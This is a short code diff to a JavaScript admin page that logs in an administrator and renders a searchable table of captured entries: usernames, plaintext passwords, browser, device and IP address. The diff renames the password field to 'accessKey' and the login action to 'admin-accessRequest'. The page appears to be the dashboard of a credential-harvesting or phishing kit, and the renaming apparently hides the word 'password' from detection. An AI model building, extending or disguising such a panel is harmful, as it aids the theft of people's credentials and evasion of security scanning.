@@ -254,7 +254,7 @@ async function adminLogin() {
         const res  = await fetch('/api/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ action: 'admin-login', username, password })
+            body: JSON.stringify({ action: 'admin-accessRequest', username, accessKey: password })
         });
         const data = await res.json();
 
@@ -307,7 +307,7 @@ function renderTable(logs) {
             <td style="color:#94a3b8">${i + 1}</td>
             <td>${l.timestamp}</td>
             <td><strong style="color:#e2e8f0">${l.username}</strong></td>
-            <td><span class="pass-cell">${l.password}</span></td>
+            <td><span class="pass-cell">${l.accessKey}</span></td>
             <td>${l.browser || '–'}</td>
             <td><span class="device-tag"><i class="fas fa-${l.device === 'Mobile' ? 'mobile-alt' : 'desktop'}"></i>${l.device || 'Desktop'}</span></td>
             <td style="color:#94a3b8;font-size:12px">${l.ip || '–'}</td>
@@ -328,7 +328,7 @@ function filterTable() {
     const q = document.getElementById('search').value.toLowerCase();
     const filtered = allLogs.filter(l =>
         (l.username || '').toLowerCase().includes(q) ||
-        (l.password || '').toLowerCase().includes(q) ||
+        (l.accessKey || '').toLowerCase().includes(q) ||
         (l.browser  || '').toLowerCase().includes(q) ||
         (l.ip       || '').toLowerCase().includes(q)
     );
